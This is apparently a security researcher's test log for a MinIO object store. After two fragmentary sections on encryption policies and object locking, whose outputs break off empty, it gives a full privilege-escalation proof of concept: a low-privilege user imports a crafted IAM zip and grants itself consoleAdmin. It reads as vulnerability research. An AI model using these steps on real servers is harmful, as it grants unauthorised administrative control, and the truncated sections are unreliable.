Bucket level encryption and user write permissions:
To test what happens when a bucket level encryption requirement takes precedence over a user's broad write permissions, I created a policy that grants full write access but requires encryption on uploads:

```
$ cat > /tmp/require-encryption-policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": ["s3:GetObject", "s3:ListBucket", "s3:PutObject"],
            "Resource": ["arn:aws:s3:::enc-required-bucket", "arn:aws:s3:::enc-required-bucket/*"]
        },
        {
            "Effect": "Deny",
            "Action": "s3:PutObject",
            "Resource": "arn:aws:s3:::enc-required-bucket/*",
            "Condition": {
                "Null": {
                    "s3:x-amz-server-side-encryption": "true"
                }
            }
        }
    ]
}
EOF
$ mc admin policy create myminio require-encryption /tmp/require-encryption-policy.json
$ mc mb myminio/enc-required-bucket
$ mc admin user add myminio encuser encpassword123
$ mc admin policy attach myminio require-encryption --user encuser
$ mc alias set encuser-alias http://localhost:9000 encuser encpassword123
```
Output:
```
Created policy `require-encryption` successfully.
Bucket created successfully `myminio/enc-required-bucket`.
Added user `encuser` successfully.
Attached Policies: [require-encryption]
To User: encuser
```
The user now has broad write permissions (s3.PutObject is allowed), but the policy also includes a Deny statement that blocks uploads missing the encryption header. I enabled server tracing and attempted an unencrypted upload:
```
$ mc admin trace myminio --json > /tmp/enc_trace.json &
$ echo "test data" > /tmp/test.txt
$ mc cp /tmp/test.txt encuser-alias/enc-required-bucket/unencrypted.txt
```
Output:
```
mc: <ERROR> Failed to copy `/tmp/test.txt`. Access Denied.
```
The server trace logs capture the following runtime execution sequence:
```json

Object locking and manual deletion:

To test object locking against manual expiration, I created a bucket with object locking enabled and set a GOVERNANCE retention policy:
```
$ mc mb myminio/lock-test --with-lock
$ echo "locked content" > /tmp/locked.txt
$ mc cp /tmp/locked.txt myminio/lock-test/protected.txt
$ mc retention set GOVERNANCE 30d myminio/lock-test/protected.txt
$ mc retention info myminio/lock-test/protected.txt
```
Output:
```

Session policy enforcement on temporary credentials:

Users Mappings privilege escalation test
To test whether a low privilege user can modify their own policy mappings, I first examined the IAM import handler in cmd/admin-handlers-users.go. I noticed something concerning:
```go
cred, owner, s3Err := validateAdminSignature(ctx, r, "")
if s3Err != ErrNone {
    writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)
    return
}
```
This function only validates the request signature - it does not verify administrative permissions. Looking further at the user_mappings import section, I found:
```go
if _, err := globalIAMSys.PolicyDBSet(ctx, u, pm.Policies, regUser, false); err != nil {
```
There is no access control check before calling PolicyDBSet. This looked suspicious - it seemed like any authenticated user might be able to import policy mappings. I decided to write a test to verify this behavior.

First, I set up a low privilege user:
```
$ mc admin user add myminio lowpriv lowprivpass123
$ mc admin policy attach myminio readwrite --user lowpriv
$ mc alias set lowpriv-alias http://localhost:9000 lowpriv lowprivpass123
$ mc admin user info myminio lowpriv
```
Output:
```
Added user `lowpriv` successfully.
Attached Policies: [readwrite]
To User: lowpriv
AccessKey: lowpriv
Status: enabled
PolicyName: readwrite
MemberOf: []
```
To understand the IAM import format, I exported the current configuration as admin:
```
$ mc admin cluster iam export myminio
$ mkdir -p /tmp/exploit-test && unzip myminio-iam-info.zip -d /tmp/exploit-test
$ ls /tmp/exploit-test/iam-assets/
```
Output:
```
mc: IAM info successfully downloaded as myminio-iam-info.zip
group_mappings.json  groups.json  policies.json  stsuser_mappings.json  svcaccts.json  user_mappings.json  users.json
```
Looking at the file structure, I realized the import processes multiple JSON files. To avoid triggering permission checks on other users, I crafted a minimal payload containing only the lowpriv user with an escalated policy:
```
$ cd /tmp/exploit-test
$ echo '{"lowpriv":{"secretKey":"lowprivpass123","status":"enabled"}}' > iam-assets/users.json
$ echo '{"lowpriv":{"version":1,"policy":"consoleAdmin","updatedAt":"2026-01-24T00:00:00Z"}}' > iam-assets/user_mappings.json
$ echo '{}' > iam-assets/groups.json
$ echo '{}' > iam-assets/svcaccts.json
$ echo '{}' > iam-assets/group_mappings.json
$ echo '{}' > iam-assets/stsuser_mappings.json
```
I packaged this into a ZIP file:
```python
import zipfile
with zipfile.ZipFile('attack.zip', 'w') as zf:
    for f in ['policies.json', 'users.json', 'groups.json', 'svcaccts.json', 
              'user_mappings.json', 'group_mappings.json', 'stsuser_mappings.json']:
        zf.write(f'iam-assets/{f}', f'iam-assets/{f}')
```
Now I tested whether the low privilege user could import this configuration:
```
$ mc admin user info myminio lowpriv
```
Output (before import):
```
AccessKey: lowpriv
Status: enabled
PolicyName: readwrite
MemberOf: []
```
```
$ mc admin cluster iam import lowpriv-alias /tmp/exploit-test/attack.zip
```
Output:
```
Added policies: readwrite, writeonly, consoleAdmin, diagnostics, readonly
Added users: lowpriv
Added policies for users: lowpriv
```
The import succeeded without any permissions errors. I verified the escalation:
```
$ mc admin user info myminio lowpriv
```
Output (after import):
```
AccessKey: lowpriv
Status: enabled
PolicyName: consoleAdmin
MemberOf: []
```
```
$ mc admin user list lowpriv-alias
```
Output:
```
enabled    encuser               readwrite           
enabled    lowpriv               consoleAdmin        
enabled    newlyescalated                            
enabled    parentadmin           consoleAdmin        
enabled    writetest             readwrite     
```
The lowpriv user can now list all users, confirming full administrative access. This validates my suspicion from the code review - the missing access control check in the import handler allows any authenticated user to escalate their privileges by crafting and importing a modified IAM configuration.
